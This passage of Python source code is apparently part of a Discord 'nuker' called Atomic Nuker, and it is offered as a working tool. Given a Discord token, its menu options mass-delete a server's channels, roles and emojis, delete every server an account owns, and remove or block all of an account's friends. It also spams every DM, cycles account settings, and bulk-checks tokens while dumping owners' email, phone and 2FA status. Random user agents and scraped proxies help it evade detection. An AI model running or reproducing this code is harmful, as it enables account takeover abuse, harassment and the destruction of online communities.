                print_(f"[!!] Started Deleting {len(r.json())} channel(s)")
                def delete(channel):
                    b = req.delete(url=f"https://discord.com/api/channels/{channel}",
                               headers={ "Authorization": tokens()[0],
                                        "X-Audit-Log-Reason": "By Atomic Nuker",
                                        "User-Agent": random_useragent()})
                    print_success(f"Deleted {Col.gray}{channel}") if b.status_code == 200 else print_err(f'Failed to delete {Col.red}{channel}')
                channels = [i['id'] for i in r.json()]
                # print_(f'[!!] Started Deleting {len(channels)} channel(s)')
                for channel in channels: 
                    Thread(target=delete, args=(channel, ), name=channel).start()
                    time.sleep(0.5)
                else:
                    time.sleep(1)
                    await tokenTools()
            else:
                print_err("There Was an error while scrapping channels")
                time.sleep(5)
                await tokenTools()
        else: 
            await tokenTools()
    if ch == '12':
        print_logo()
        print_('[=] Enter guild id')
        guild = input_()
        if len(tokens()) >0 and guild.isalnum(): 
            r = req.get(url=f"https://discord.com/api/guilds/{guild}/roles",
                        headers={ "Authorization": tokens()[0],
                                 "User-Agent": random_useragent(),
                                 "Content-Type": "application/json"})
            if r.status_code == 200:
                def delRole(guild_id,role_id):
                    b = req.delete(url=f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}",
                                   headers= { "Authorization": tokens()[0],
                                             "User-Agent": random_useragent(),
                                             "X-Audit-Log-Reason": "By Atomic Nuker"})
                    print_success(f"Deleted {Col.gray}{role_id}") if b.status_code == 204 else print_err(f'Failed to delete {Col.red}{role_id}')
                roles = [i['id'] for i in r.json()]
                print_logo()
                print_(f'[!!] Started Deleting {len(roles)} role(s)')
                for role in roles:
                    Thread(target=delRole, args=(guild, role), name=role).start()
                    time.sleep(0.5)
                else:
                    time.sleep(3)
                    await tokenTools()
            else: await tokenTools()
        else: await tokenTools()
    if ch == '13':
        print_logo()
        print_("[=] Enter guild id")
        guild = input_()
        if guild.isalnum() and len(tokens()) >0:
            e = req.get(f"https://discord.com/api/guilds/{guild}/emojis",
                        headers={"Authorization": tokens()[0],
                                "User-Agent": random_useragent()})
            emojis = [[i['id'], i['name']] for i in e.json()]
            print_logo()
            print_(f"[!!] Started deleting {len(emojis)} emoji(s)")
            for emoji in emojis:
                d = req.delete(url=f"https://discord.com/api/guilds/{guild}/emojis/{emoji[0]}",
                            headers= {
                                "Authorization": tokens()[0],
                                "X-Audit-Log-Reason": "By Atomic Nuker",
                                "User-Agent": random_useragent()
                            })
                print_success(f"Deleted {Col.gray}{emoji[1]}") if d.status_code == 204 else print_err(f'Failed to delete {Col.red}{emoji[1]}')
            else:
                await tokenTools()
        else: await tokenTools()
    
    if ch == '14':
        print_logo()
        print_("[=] Enter guild id")
        guild = input_()
        if len(tokens()) >0 and guild.isalnum():
            with open('server_icon.png', 'rb') as icon:
                # file = @server_icon.png
                req.patch(url=f"https://discord.com/api/guilds/{guild}",
                          headers= {
                              "Authorization": tokens()[0],
                              "X-Audit-Log-Reason": "By Atomic Nuker",
                              "user-agent": random_useragent()
                          },
                          json={"icon": f"data:image/png;base64,{base64.b64encode(icon.read()).decode(encoding='utf8')}"})
                await tokenTools()
        else:
            await tokenTools()
    
    if ch == '15':
        print_logo()
        print_("[=] Enter the token")
        token = input_()

        r = req.get(url="https://canary.discord.com/api/v8/users/@me/relationships",
                    headers= {"Authorization": token,
                              "User-Agent": random_useragent()})
        if r.status_code == 200:
            friends = [i['id'] for i in r.json()]
            print_logo()
            print_(f"[!!] Started removing {len(friends)} friend()")
            for friend in friends:
                req.delete(url=f"https://canary.discord.com/api/v8/users/@me/relationships/{friend}",
                           headers={ "Authorization": token,
                                    "user-agent": random_useragent()})
                print_success(f"removed {Col.green}{friend}")
            else:
                await tokenTools()
        else: await tokenTools()
    if ch == '16':
        print_logo()
        print_("[=] Enter the token")
        token = input_()
        headers = {"Authorization": token, "User-Agent": random_useragent()}
        r = req.get(url="https://canary.discord.com/api/v8/users/@me/relationships",
                    headers= headers)
        if r.status_code == 200:
            friends = [i['id'] for i in r.json()]
            print_(f'[!!] Started blocking {len(friends)} friend(s)')
            for friend in friends:
                b = req.put(f"https://canary.discord.com/api/v8/users/@me/relationships/{friend}",
                headers=headers,
                json={"type": 2},
                )
                print_success(f"Blocked {Col.red}{friend}") if b.status_code == 204 else print_err(f"Failed to block {Col.gray}{friend}")
            else:
                await tokenTools()
        else: await tokenTools()
    if ch == '17':
        print_logo()
        print_("[=] Enter the token")
        token = input_()

        headers = { "Authorization": token, "User-Agent": random_useragent()}
        svs = req.get(url="https://canary.discord.com/api/v8/users/@me/guilds",
                      headers=headers)
        if svs.status_code == 200: 
            servers = [i['id'] for i in svs.json()]
            print_logo()
            print_(f"[!!] Started leaving from {len(servers)} server(s)")
            for server in servers:
                b = req.delete(url=f"https://canary.discord.com/api/v8/users/@me/guilds/{server}",
                           headers=headers)
                print_success(f"Leaved {Col.green}{server}") if b.status_code == 204 else print_err(f"Failed to leave {Col.red}{server}")
                time.sleep(1)
                # input()
            else:
                await tokenTools()
        else:
            await tokenTools()
    if ch == '18':
        print_logo()
        print_("[=] Enter the token")
        token = input_()
        headers = { "Authorization": token, "User-Agent": random_useragent()}
        print_logo()
        print_("[!!] Started Cycling, This will take a minute")
        def random_locale():
            lst = ['ar', 'de', 'be', 'ko', 'bg', 'th', 'hi', 'ja', 'uk', 'ru', 'fr', 'es', 'it', 'lt']
            return random.choice(lst)
        for i in range(30):
            condition_status = True
            payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": random_locale(), "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
            b = req.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
            print_success("Changed Settings") if b.status_code == 200 else print_err("Failed to change settings")
            time.sleep(1)
            condition_status = False
            payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": random_locale(), "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
            b = req.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
            print_success("Changed Settings") if b.status_code == 200 else print_err("Failed to change settings")
            # print(b.status_code)
            time.sleep(1)
        else:
            await tokenTools()

    if ch == '19':
        print_logo()
        print_("[=] Enter the token")
        token = input_()
        print_("[=] Enter the message that you want to send in dms")
        msg = input_()

        headers = { "Authorization": token, "User-Agent": random_useragent()}
        dms = req.get("https://canary.discord.com/api/v8/users/@me/channels",
                      headers=headers)
        if dms.status_code == 200:
            print_logo()
            print_(f"[!!] Started sending message in {len(dms.json())} dm(s)")
            for dm in [i['id'] for i in dms.json()]:
                sendMessage(channel=dm, msg=msg, token=token)
            else:
                await tokenTools()
        else:
            await tokenTools()
    if ch == '20':
        print_logo()
        print_("[=] Enter the token")
        token = input_()
        headers = { "Authorization": token, "User-Agent": random_useragent()}
        dms = req.get("https://canary.discord.com/api/v8/users/@me/channels",
                      headers=headers)
        if dms.status_code == 200:
            print_logo()
            print_(f'Started Closing {len(dms.json())} dm(s)')
            for dm in dms.json():
                b = req.delete(
                f"https://canary.discord.com/api/v8/channels/{dm['id']}",
                headers=headers)
                print_success(f"Closed {Col.green}{dm['id']}") if b.status_code == 200 else print_err(f"Failed to close {dm['id']}")
            else:
                await tokenTools()

    if ch == '21':
        print_logo()
        print_("[=] Enter the token")
        token = input_()
        headers = { "Authorization": token, "User-Agent": random_useragent()}
        guilds = req.get(url="https://discord.com/api/v9/users/@me/guilds",
                         headers=headers)
        if guilds.status_code == 200:
            print_logo()
            print_("[!!] Started deleting")

            for guild in guilds.json():
                b = req.post(url=f"https://canary.discord.com/api/v9/guilds/{guild['id']}/delete",
                         headers=headers)
                # print(b.status_code)
                print_success(f"Deleted {Col.green}{guild['id']}") if b.status_code == 204 else print_err(f"Failed to delete {guild['id']}")
            else:
                await tokenTools()
    if ch == '22':
        print_logo()
        print_("[=] Enter the token")
        token = input_()
        headers = { "Authorization": token, "user-agent": random_useragent()}
        info = req.get(url="https://discordapp.com/api/v6/users/@me",
                       headers=headers)
        print_logo()
        if info.status_code == 200:
            print_success(f"{token} | {info.json()['username']} Is Valid")
        else:
            print_err(f"{token} is invalid")
        
        print_("[!!] Press Enter to continue")
        input()
        await tokenTools()

    if ch == '23':
        print_logo()
        valids = []
        invalids = []
        if len(tokens()) > 0:
            def decrypt_id(token: str):
                try:
                    return str(base64.b64decode(token.split('.')[0]), 'utf-8')
                except:
                    try: return str(base64.b64decode(f'{token.split(".")[0]}==', 'utf-8'))
                    except:
                        return 'Unknown'
            print_(f"[!!] Started Checking {len(tokens())} token(s)")
            print_logo()
            for token in tokens(): 
                headers = { "Authorization": token, "user-agent": random_useragent()}
                info = req.get(url="https://discordapp.com/api/v6/users/@me",
                            headers=headers)
                # print_logo()
                if info.status_code == 200:
                    print_success(f"{token} | {info.json()['username']} Is Valid")
                    valids.append(token) if not token in valids else ' '
                else:
                    invalids.append(token) if not token in invalids else ' '
                    print_err(f"{Col.red}{token} | {decrypt_id(token)} is Invalid")
            else:
                print_("[!!] Press Enter to continue")
                input()
                print_logo()
                print_(f"[??] Are you willing to save {len(valids)} valid token(s)? [Y, N]")
                yon = input_()
                if yon.lower().startswith('y'):
                    with open("./Atomic/valids.txt", 'w') as file:
                        file.write('\n'.join(valids))
                    with open("./Atomic/invalids.txt", "w") as file:
                        file.write('\n'.join(invalids))
                    print_("[!!] Saved In /Atomic, Press Enter to continue")
                    input()
                await tokenTools()
    if ch == '24':
        print_logo()
        print_("[=] Enter the token")
        token = input_()
        print_("[=] Enter the guild id")
        guild = input_()
        headers = { "Authorization" : token, "User-Agent": random_useragent()}
        print_logo()
        print_("[*] Processing...")
        guild_info = req.get(f"https://discord.com/api/guilds/{guild}",
                             headers = headers)
        if guild_info.status_code == 200:
            bl = Col.light_blue ; re = Col.red ; pi = Col.pink ; cy = Col.cyan ; ye = Col.yellow ; pu = Col.purple ; green = Col.green ; gray = Col.gray
            js = guild_info.json()
            name = js['name']
            description = js['description']
            features = js['features']
            emojis = js['emojis']
            owner_id = js['owner_id']
            owner = req.get(f"https://discord.com/api/users/{owner_id}", headers=headers).json()['username']
            roles = js['roles']
            region = js['region']
            channels = req.get(f"https://discord.com/api/guilds/{guild}/channels").json()
            status = f'''
        {re} {guild} {ye}| {pi} {name} 
    {bl}Description: {pi}{description}
    {bl}Owner: {pi}{owner_id} {ye} | {green}{owner}
    {bl}Features: {gray}{', '.join(features)} 
    {bl}Creation Date: {pi}{datetime.utcfromtimestamp(((int(guild) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')}

    {cy}Emojis: {pi}{len(emojis)}
    {cy}Roles: {pi}{len(roles)}
    {cy}Channels: {pi}{len(channels)}
    
'''
            print_logo()
            print(status)
        else:
            print_err("An Error Occured")
        print_("[!!] Press Enter to continue")
        input()
        await tokenTools()




    if ch =='25':
        print_logo()
        print_("[=] Enter the token")
        token = input_()
        bl = Col.light_blue ; re = Col.red ; pi = Col.pink ; cy = Col.cyan ; ye = Col.yellow ; pu = Col.purple ; green = Col.green ; gray = Col.gray
        headers = { "Authorization": token, "user-agent": random_useragent()}
        info = req.get(url="https://discordapp.com/api/v6/users/@me",
                       headers=headers)
        i = info.json()
        if info.status_code == 200:
            print_logo()
            print_("[*] Processing...\n")
            id_ = i['id']
            username = i['username']
            discrim = i['discriminator']
            email = i['email']
            verified = i['verified']
            phone = i['phone']
            mfa = i['mfa_enabled']
            flags = i['flags']
            creation = datetime.utcfromtimestamp(((int(i['id']) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            try: guilds = req.get(url="https://discord.com/api/v9/users/@me/guilds",headers=headers).json()
            except: guilds = []
            try: dms = req.get(url="https://canary.discord.com/api/v8/users/@me/channels", headers=headers).json()
            except: dms = []
            try: friends = req.get(url="https://canary.discord.com/api/v8/users/@me/relationships", headers=headers).json()
            except: friends = []

            def nitro_info():
                has_nitro = False
                res = req.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                nitro_data = res.json()
                has_nitro = bool(len(nitro_data) > 0)
                if has_nitro:
                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    return abs((d2 - d1).days)
                else: 
                    return False

            status = f'''
{green}   Token: {re}{token}

        {bl}Username: {pi}{username}#{discrim} 
        {bl}ID: {pi}{id_}
        {bl}Email: {pi}{email}
        {bl}Verified: {pi}{verified}
        {bl}Phone: {pi}{phone}

        {bl}2FA / MFA Enabled: {pi}{mfa}
        {bl}Flags: {pi}{flags}

        {bl}Creation Date: {pi}{creation}
        {cy}Servers: {pu}{len(guilds)} {cy}, Dms: {pu}{len(dms)}{cy}, friends:{pu} {len(friends)} 


        {ye}Nitro Info: 
            {gray}   Has Nitro?:{bl} {f"True{green} {nitro_info()}{pi} Days Left" if nitro_info() else False} 

{Colors.reset}'''
            print_logo()
            print(status)
        else:
            print_err("Invalid Token")

        print_("[!!] Press Enter to Continue")
        input()
        await tokenTools()
    if ch == '26':
        print_logo()
        if len(tokens()) > 0:
            print_(f"[*] Processing {len(tokens())} token(s)...")
            for token in tokens():
                bl = Col.light_blue ; re = Col.red ; pi = Col.pink ; cy = Col.cyan ; ye = Col.yellow ; pu = Col.purple ; green = Col.green ; gray = Col.gray
                headers = { "Authorization": token, "user-agent": random_useragent()}
                info = req.get(url="https://discordapp.com/api/v6/users/@me",
                            headers=headers)
                i = info.json()
                if info.status_code == 200:
                    # print_logo()
                    # print_("[*] Processing...\n")
                    id_ = i['id']
                    username = i['username']
                    discrim = i['discriminator']
                    email = i['email']
                    verified = i['verified']
                    phone = i['phone']
                    mfa = i['mfa_enabled']
                    flags = i['flags']
                    creation = datetime.utcfromtimestamp(((int(i['id']) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
                    try: guilds = req.get(url="https://discord.com/api/v9/users/@me/guilds",headers=headers).json()
                    except: guilds = []
                    try: dms = req.get(url="https://canary.discord.com/api/v8/users/@me/channels", headers=headers).json()
                    except: dms = []
                    try: friends = req.get(url="https://canary.discord.com/api/v8/users/@me/relationships", headers=headers).json()
                    except: friends = []

                    def nitro_info():
                        has_nitro = False
                        res = req.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            return abs((d2 - d1).days)
                        else: 
                            return False

                    status = f'''
        

        {green}   Token: {re}{token}

                {bl}Username: {pi}{username}#{discrim} 
                {bl}ID: {pi}{id_}
                {bl}Email: {pi}{email}
                {bl}Verified: {pi}{verified}
                {bl}Phone: {pi}{phone}

                {bl}2FA / MFA Enabled: {pi}{mfa}
                {bl}Flags: {pi}{flags}

                {bl}Creation Date: {pi}{creation}
                {cy}Servers: {pu}{len(guilds)} {cy}, Dms: {pu}{len(dms)}{cy}, friends:{pu} {len(friends)} 


                {ye}Nitro Info: 
                    {gray}   Has Nitro?:{bl} {f"True{green} {nitro_info()}{pi} Days Left" if nitro_info() else False} 

        {Colors.reset}'''
                    # print_logo()
                    print(status)
                else:
                    print_err(f"{token} Invalid")
            else:
                print_("[!!] Press Enter to continue")
                input()
                await tokenTools()
        else: await tokenTools()

async def proxies():
    print_logo()
    menu = '''
     << Proxies >> 
    1. Scrapp proxies
    2. Check current proxies
    3. scrapp and check proxies
    4. main menu
    5. exit
'''
    print_(menu)
    print_("[~/Proxies] Choose and Option")
    ch = input_()
    if not ch in (str(i) for i in range(1,6)): await proxies()
    if ch == '1':
        print_logo()
        data = req.get('https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt').text
        print_(f"[??] Are you willing to import {len(data.split())} proxies to 'proxies.txt' file? [Y, N]")
        yon = input_()
        if yon.lower().startswith('y'):
            with open('proxies.txt', 'w') as file:
                file.write(data)
        
        await proxies()
    if ch == '2':
        with open("proxies.txt", 'r') as file:
            proxies_ = file.readlines()
        if len(proxies_) > 0:
            print_logo()
            print_(f"[!!] Started checking {len(proxies_)} proxies")
            lst = [i.strip() for i in proxies_]
            valids = []
            for proxy in lst:
                try:
                    b = req.get(url="https://api.myip.com", proxies={"http": proxy})
                    valids.append(proxy)
                    print_success(str(proxy))
                except: 
                    print_err(str(proxy))
            else:
                if len(valids) > 0:
                    print_logo()
                    print_(f"[??] Are you willing to save {len(valids)} proxies in your 'proxies.txt' file? [Y, N]")
                    yon = input_()
                    if yon.lower().startswith('y'):
                        with open('proxies.txt', 'w') as file:
                            file.write('\n'.join(valids))
                    
                
                await proxies()
    
    if ch == '3':
        print_logo()
        proxies_ = req.get("https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt").text
        lst = [i.strip() for i in proxies_.split()]
        print_(f"[!!] Imported {len(lst)} proxies")
        valids = []
        print_logo()
        print_("[!!] Started checking proxies")
        for proxy in lst:
            try:
                b = req.get(url="https://api.myip.com", proxies={"http": proxy})
                valids.append(proxy)
                print_success(str(proxy))
            except: 
                print_err(str(proxy))
        else:
            if len(valids) > 0:
                print_logo()
                print_(f"[??] Are you willing to save {len(valids)} proxies in your 'proxies.txt' file? [Y, N]")
                yon = input_()
                if yon.lower().startswith('y'):
                    with open('proxies.txt', 'w') as file:
                        file.write('\n'.join(valids))
                
            
            await proxies()
    if ch == '4':
        await main_menu()
    if ch == '5':
        sys.exit()
                
        

async def main_menu():
    print_logo()
    menu_txt = '''
        << Main Category >> 
        1. Discord Webhook Tools
        2. Discord Token Tools
        3. Proxy Scrapper
        4. Exit
        

    '''
    Write.Print(menu_txt, Colors.yellow_to_green, interval=0.003)
    print_("[~] Choose an Option")
    choice = input_()
    if not choice in ['1', '2', '3', '4']:
        await main_menu()
    if choice == '4':
        sys.exit()
    if choice == '1':
        await webhookTools()
    if choice == '2':
        await tokenTools()
    if choice == '3': 
        await proxies()

        # await Atomic_Nuking()
    


asyncio.run(main_menu())
